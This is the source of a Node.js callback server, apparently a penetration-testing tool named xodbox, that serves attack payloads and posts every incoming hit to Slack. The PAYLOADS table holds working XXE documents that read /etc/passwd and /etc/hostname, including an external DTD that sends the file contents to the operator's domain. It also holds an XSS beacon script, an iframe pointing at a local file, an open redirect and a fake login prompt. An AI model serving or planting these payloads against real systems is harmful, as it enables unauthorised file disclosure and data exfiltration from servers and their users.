// content of index.js
const http = require('http');
const https = require('https');
const fs = require('fs');
const port = 3000
const querystring = require('querystring');

const SLACK_URL = process.env.SLACK_URL
const SLACK_CHANNEL = process.env.SLACK_CHANNEL || '#borked'
const SLACK_USER = process.env.SLACK_USER || 'hookbot'
const SLACK_ICON = process.env.SLACK_ICON || ':ghost:'
const DEFAULT_DOMAIN = process.env.DEFAULT_DOMAIN
const LOGO_FILE = process.env.LOGO_FILE || 'default-logo.svg'
const LOGO_SVG = fs.readFileSync(`/usr/src/app/static/${LOGO_FILE}`)
const ALERT_PATTERN = 'H'

const PAYLOADS = {
  'sh': {
    contentType: 'text/xml',
    content: `<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\n<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n<text font-size="16" x="0" y="16">&xxe;</text>\n</svg>`
  },
  'dt': {
    contentType: 'text/xml',
    content: `<?xml version="1.0" encoding="ISO-8859-1"?>\n <!DOCTYPE foo [  <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://${DEFAULT_DOMAIN}/${ALERT_PATTERN}/xxe-test" >]><foo>&xxe;</foo>`,
  },
  'evil.dtd': {
    contentType: 'text/xml',
    content: `<!ENTITY % payl SYSTEM "file:///etc/passwd">\n<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://${DEFAULT_DOMAIN}:80/${ALERT_PATTERN}/xxe?p=%payl;'>">`
  },
  'js': {
    contentType: 'text/javascript',
    content: `var s = document.createElement("img");document.body.appendChild(s); s.src="//${DEFAULT_DOMAIN}/${ALERT_PATTERN}/s";`
  },
  'ht': {
    contentType: 'text/html',
    content: `<html><body><img src="/${ALERT_PATTERN}/static-lh" /><iframe src="file:///etc/passwd" height="500"></iframe></body></html>`
  },
  'sv': {
    contentType: 'image/svg+xml',
    content: `<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>`
  },
  'logo': {
    contentType: 'image/svg+xml',
    content: LOGO_SVG
  }
}

function slackPost(text) {
  console.log('slackpost');

  let payload = querystring.stringify({
    payload: JSON.stringify({
      "channel": SLACK_CHANNEL,
      "username": SLACK_USER,
      "icon_emoji": SLACK_ICON,
      "text": text
    })
  });

  let url = new URL(SLACK_URL);
  let opts = {
    hostname: url.hostname,
    port: 443,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': payload.length
    }
  };
  let req = https.request(opts, (res) => {
    console.log('statusCode:', res.statusCode);
    console.log('headers:', res.headers);
    res.on('data', (d) => {
      console.log(d.toString('utf8'));
    });
  });

  req.on('error', (e) => {
    console.error(e);
  });
  req.write(payload);
  req.end();
}

function isNumeric(n) {
  return !isNaN(parseFloat(n)) && isFinite(n);
}

const requestHandler = (request, response) => {

  // start of new HTTP request
  let requestDataSlabList = [],
    httpMethod = request.method.toUpperCase(),
    requestURI = request.url;

  // wire up request events
  request.on('data', (data) => {
    // add received data to buffer
    requestDataSlabList.push(data);
  });

  request.on('end', (data) => {
    console.log('vvvvvvvvvvvvvvvvvvvvvvv');
    console.log(new Date().toUTCString());

    let reqAr = requestURI.split('/');
    let redir;
    reqAr.shift(); // remove first empty entry
    let mode = reqAr.shift();
    let remoteAddr = request.headers['x-real-ip'];
    let code;
    let assigned_code;
    response.setHeader('Server', 'BreakfastBot/1.1');
    response.setHeader('Access-Control-Allow-Origin', '*');

    // write/append received request to file
    let headerItemList = [],
      userAgent = 'no user agent',
      dataSlab = requestDataSlabList.join('');

    for (let headerItem of Object.keys(request.headers).sort()) {
      if (headerItem.match(/user\-agent/i)) {
        userAgent = request.headers[headerItem];
      }
      headerItemList.push(`${headerItem}: ${request.headers[headerItem]}`);
    }

    console.log(
      `-----\n${httpMethod} ${requestURI}\n` +
      `${headerItemList.join('\n')}\n\n${dataSlab}\n\n`
    );

    switch (mode) {
      case 'robots.txt':
        response.statusCode = 200;
        response.end('User-agent: *\nDisallow: /')
        break;
      case 'unfurly':
        response.setHeader('Content-Type', 'text/html')
        response.end([
          `<html><head>`,
          `<meta property="og:title" content="Unfurly" />`,
          `<meta property="og:description" content="${userAgent}" />`,
          //`<meta name="twitter:image:src" value="" />`,
          `<meta name="twitter:label1" value="IP Address" />`,
          `<meta name="twitter:data1" value="${remoteAddr}" />`,
          `<meta name="twitter:label2" value="" />`,
          `<meta name="twitter:data2" value="" />`,
          `</head><body>`,
          `</body></html>`,
        ].join("\n"))
        break;
      case 'json':
        response.setHeader('Content-Type', 'application/json"')
        if (reqAr[0] == 'b64') {
          reqAr.shift(); // remove b64
          content = new Buffer(reqAr.join('/'), 'base64').toString('ascii')
        } else {
          content = unescape(reqAr.join('/'));
        }
        response.end(content);
        break;
      // case 'html':
      //   if (reqAr[0] == 'b64') {
      //     reqAr.shift(); // remove b64
      //     content = new Buffer(reqAr.join('/'), 'base64').toString('ascii')
      //   } else {
      //     content = unescape(reqAr.join('/'));
      //   }
      //   response.end(content);
      //   break;
      case 'redirect':
        if (reqAr[0] == 'b64') {
          reqAr.shift(); // remove b64
          redir = new Buffer(reqAr.join('/'), 'base64').toString('ascii')
        } else {
          redir = reqAr.join('/');
        }
        response.statusCode = 301;
          response.setHeader('Location', redir.split('?')[0]);
          console.log('* Redirect', redir)

        response.end('i am dead')
        break;
      case ALERT_PATTERN + 'x':
        let xPayload = PAYLOADS[reqAr.shift()] || 'pizza'
        slackPost(
          'Hook use detected ```' +
          `-----\n${httpMethod} ${requestURI}\n` +
          `${headerItemList.join('\n')}\n\n${dataSlab}\n\n` +
          '```'
        );
        response.setHeader('content-type', xPayload.contentType || 'text/plain');
        response.end(xPayload.content);
        break;
      case ALERT_PATTERN:
        response.statusCode = 200
        slackPost(
          'Hook use detected ```' +
          `-----\n${httpMethod} ${requestURI}\n` +
          `${headerItemList.join('\n')}\n\n${dataSlab}\n\n` +
          '```'
        );
        if (request.body && request.body.match(/challenge/)) {
          response.end(JSON.parse(request.body).challenge);
          break;
        } else if (requestURI.match(/\.mp4$/)) {
          response.setHeader('content-type', 'video/mp4');
          // i am an mp4, I promise
          response.end("\x00\x00\x00\x20\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00");
          break;
        }
      case 'a':
      default:
        response.statusCode == 200;
        if (mode == 'a') {
          response.statusCode = 401
          response.setHeader('WWW-Authenticate', 'Basic realm="Event Login"')
        }
        response.setHeader('content-type', PAYLOADS.logo.contentType);
        response.end(PAYLOADS.logo.content)
        break;
    }
    console.log('^^^^^^^^^^^^^^^^^^^^^^^');
  });
}

const server = http.createServer(requestHandler)
server.listen(port, (err) => {
  console.warn("the node.js version of xodbox is being deprecated. please migrate to the golang version.")
  if (err) {
    return console.log('something bad happened', err)
  }
  console.log(`server is listening on ${port}`)
})
